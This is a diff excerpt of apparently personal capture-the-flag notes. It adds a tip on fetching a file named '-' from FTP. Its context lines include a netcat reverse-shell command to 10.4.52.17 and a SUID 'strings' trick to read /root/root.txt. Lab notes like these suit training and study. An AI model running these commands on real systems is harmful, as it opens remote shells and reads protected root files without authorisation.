@@ -45,5 +45,17 @@ cmd=nc -e /bin/bash 10.4.52.17 9999 (sometimes Netcat traditional reverse-shell 
 
 /usr/bin/strings (strings suid file is exploited)
 #strings /root/root.txt 
+_____________________________________________________________________________________________________________________________
+-rw-r--r--    1 0        0             151 Jun 18  2021 -
+drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
+drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
+226 Directory send OK.
+
+Some ftp has a file like that (-) 
+FTP> get./-
+
+in machine
+----------
+#cat ./-
 
 
